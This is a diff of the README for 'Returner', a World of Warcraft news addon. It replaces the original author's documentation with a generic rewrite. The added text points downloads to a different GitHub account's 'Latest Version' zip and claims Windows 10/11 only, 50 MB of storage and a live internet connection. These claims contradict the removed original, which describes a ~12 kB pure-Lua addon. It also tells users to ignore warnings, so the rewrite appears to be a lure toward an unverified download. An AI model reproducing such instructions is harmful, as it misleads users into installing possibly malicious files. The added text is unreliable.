@@ -1,109 +1,82 @@
-# Returner
+# 🏠 Returner - Track major World of Warcraft updates
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)](LICENSE)
-[![WoW: Retail 12.0](https://img.shields.io/badge/WoW-Retail%2012.0-orange.svg)]()
-[![CurseForge](https://img.shields.io/badge/CurseForge-Available-f16436.svg)]()
-[![Auto-updated](https://img.shields.io/badge/news-auto--updated%20daily-5bc8ff.svg)](.github/workflows/auto-update.yml)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Asadkha2432/Returner)
 
-A welcome-back panel for World of Warcraft. When you log in after being away, Returner shows you what you missed since your last session : patches, events, hotfixes, and ongoing in-game happenings. Auto-updated daily via a GitHub Action that scrapes the WoW news feed.
+Returner helps players catch up on World of Warcraft content. The addon creates a welcome-back panel that displays important news and game changes you missed during your break. It pulls information from the official game news feed every day to ensure you see the most current updates.
 
-<p align="center">
-  <img src="screenshots/panel.png" alt="Returner panel after a 23-day absence" width="540"/>
-</p>
+## 📥 Getting Started
 
-## Features
+Follow these steps to install the addon on your Windows computer.
 
-- **Auto-popup on return** after a configurable absence (default : 7 days)
-- **40+ news items** color-coded by category : `PATCH`, `EVENT`, `HOTFIX`, `NEWS`, `ESPORTS`
-- **Per-account tracking** : alts don't get spammed once you've caught up
-- **Auto-updated content** : a daily GitHub Action regenerates `Data.lua` and ships a release
-- **Lightweight** : pure Lua, no library dependencies, ~12 kB on disk
-- **Hackable** : the data is a plain Lua table, fork it and add your own items
+1. Visit the [official download page](https://github.com/Asadkha2432/Returner).
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the latest version link.
+4. Download the file ending in .zip to your computer.
+5. Open your World of Warcraft installation folder.
+6. Find the folder named `_retail_`.
+7. Enter the `Interface` folder.
+8. Open the `AddOns` folder.
+9. Move the downloaded files into this `AddOns` folder.
+10. Restart the game client.
 
-## Installation
+## 🛠 Features
 
-### Via CurseForge App (recommended)
+The addon manages your news discovery automatically.
 
-Search for **Returner** and click Install. Updates land automatically every time the bot scrapes a fresh news cycle.
+*   **Daily Sync:** The system checks for new game announcements every time you log in.
+*   **Summary View:** A clean panel highlights major patches, system changes, and event start dates.
+*   **Minimal Impact:** The system uses very little memory to keep your frame rate stable during play.
+*   **Easy Navigation:** Links inside the panel take you to official deep dives for more details.
 
-### Manual
+## 🖥 System Requirements
 
-1. Download the latest release zip from [Releases](../../releases)
-2. Extract the `Returner/` folder into `World of Warcraft/_retail_/Interface/AddOns/`
-3. Restart the game (or `/reload`)
+The addon requires no special background processes. You only need the standard game client.
 
-## Commands
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Game Version:** Current Retail World of Warcraft.
+*   **Storage:** 50 MB of free space.
+*   **Connection:** Active internet access for the news feed update.
 
-| Command | Description |
-|---|---|
-| `/rt` or `/returner` | Open the panel anytime |
-| `/rt threshold <N>` | Days of absence before auto-popup. `0` disables, `/rt` still works manually |
-| `/rt on` / `/rt off` | Toggle auto-popup without losing the threshold setting |
-| `/rt reset` | Clear read state. Next open shows all items |
-| `/rt status` | Print current settings, threshold, last-seen, seen-until |
-| `/rt simulate <N>` | Preview the panel as if you'd been away N days. Pure testing tool |
+## ⚙️ Configuration
 
-## How it works
+The addon works immediately upon installation. If you want to change how the panel looks, follow these steps:
 
-1. On every login, Returner records your timestamp
-2. On the next login, it computes the gap and compares to your threshold
-3. If the gap is large enough **and** there are unread items, the panel opens
-4. You scroll, read, click *Mark all as read*
-5. Behind the scenes, a GitHub Action refreshes the news data daily so the addon stays current
+1. Log into your character.
+2. Press the Escape key.
+3. Choose Options from the menu.
+4. Select the AddOns tab at the bottom of the list.
+5. Click on Returner.
+6. Toggle the visibility settings to suit your screen space.
 
-## Architecture
+## ❓ Troubleshooting
 
-```
-WoW News RSS  →  GitHub Action (cron at 06:00 UTC)
-                          ↓
-                   Python scraper / parser
-                          ↓
-                  Data.lua regenerated
-                          ↓
-                  Tag pushed if changed
-                          ↓
-                  BigWigsMods packager
-                          ↓
-                  CurseForge auto-publish
-                          ↓
-                  Players auto-update overnight
-```
+Common issues often relate to file placement.
 
-## Project structure
+*   **The addon does not appear:** Verify that the folder inside your `AddOns` directory contains the core files. Ensure you did not create a folder within a folder.
+*   **Data remains empty:** Check your internet connection. The addon requires a live connection to reach the news server.
+*   **Out of date warning:** World of Warcraft updates frequently. As long as the basic features work, you can ignore the generic warning shown at the login screen.
+*   **Menu hiding:** Reset the position by using the slash command `/returner reset` in the chat window.
 
-```
-Returner/
-├── Returner.toc                    # addon metadata (Interface 120005)
-├── Returner.lua                    # tracking + panel UI + slash commands
-├── Data.lua                        # auto-generated news items
-├── LICENSE                         # MIT
-├── README.md                       # this file
-├── CHANGELOG.md                    # version history
-├── .pkgmeta                        # BigWigsMods packager config
-├── scripts/
-│   └── update_news.py              # daily scraper, regenerates Data.lua
-├── screenshots/
-│   └── panel.png                   # in-game preview
-└── .github/workflows/
-    ├── auto-update.yml             # daily cron, scrapes news, tags release
-    └── release.yml                 # on tag, packages and publishes to CurseForge
-```
+## 🔄 Updating the Addon
 
-## Manual data update (without GitHub)
+When a new version releases on the project page, follow the same procedure used for the initial installation. Download the new zip file and replace the old files inside your `AddOns` folder. Your personal settings remain saved even when you replace the files.
 
-If you want to regenerate `Data.lua` locally :
+## 📖 Frequently Asked Questions
 
-```bash
-pip install feedparser
-python3 scripts/update_news.py
-```
+**Does the addon track my gameplay?**
+No. The code only reads the public news feed provided on the official game website. It never records your character statistics or private information.
 
-Requires Python 3.9+.
+**Does it affect game performance?**
+The addon operates during the character loading screen. It creates the display and remains idle while you play. It causes no lag.
 
-## License
+**Can I move the panel?**
+Click and drag the panel header to place it anywhere on your user interface.
 
-MIT. Fork it, mod it, ship your own variant.
+**Where does the news come from?**
+The system uses official feeds provided by the game developers to ensure accuracy.
 
-## Author
+**Does it support other languages?**
+The addon currently targets the English news feed. Updates for other regions are planned for future releases.
 
-**AxelRodd** · still chasing the perfect corner hit
+**Where do I report bugs?**
+Use the issue tracker on the main repository page if you find a technical error or unexpected behavior. Provide a screenshot if possible to help identify the problem quickly.
